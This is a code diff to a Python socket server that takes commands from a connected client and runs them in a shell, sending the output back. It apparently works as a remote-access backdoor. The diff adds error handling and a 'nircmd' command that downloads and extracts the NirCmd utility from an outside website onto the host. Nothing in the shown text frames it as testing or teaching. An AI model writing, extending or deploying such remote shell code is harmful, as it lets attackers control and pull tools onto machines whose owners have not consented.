@@ -23,32 +23,46 @@ while True:
     conn, addr = s.accept()
 
     while True:
-        data = conn.recv(1024)
+        # ConnectionResetError
+        try:
+            data = conn.recv(1024)
 
-        if data == b"":
-            break
+            if data == b"":
+                break
 
-        command = data.decode().strip()
+            command = data.decode().strip()
 
-        if command.startswith("cd "):
-            try:
-                path = command[3:].strip()
-                os.chdir(path)
-                current_dir = os.getcwd()
-                r = f"Changed to dir {current_dir}\n".encode()
-            except Exception as e:
-                r = str(e).encode()
-        else:
-            try:
-                r = subprocess.check_output(
-                    data.decode(), shell=True, stderr=subprocess.STDOUT
+            if command.startswith("cd "):
+                try:
+                    path = command[3:].strip()
+                    os.chdir(path)
+                    current_dir = os.getcwd()
+                    r = f"[+] Changed to dir {current_dir}\n".encode()
+                except Exception as e:
+                    r = str(e).encode()
+            elif command == "nircmd":
+                os.system(
+                    "curl https://www.nirsoft.net/utils/nircmd.zip -o nircmd.zip && tar -xf nircmd.zip && del nircmd.zip"
                 )
+                r = "[+] Downloaded NirCmd and delted folder\n".encode()
+            else:
+                try:
+                    r = subprocess.check_output(
+                        data.decode(), shell=True, stderr=subprocess.STDOUT
+                    )
 
-            except subprocess.CalledProcessError as e:
-                r = e.output
+                    if not r:
+                        r = "[+] Command succes just no output\n".encode()
 
-            except Exception as e:
-                r = str(e).encode()
+                except subprocess.CalledProcessError as e:
+                    r = e.output
+
+                except Exception as e:
+                    r = str(e).encode()
+        except ConnectionResetError:
+            break
+        except Exception as e:
+            r = str(e).encode()
 
         conn.sendall(r)
     conn.close()
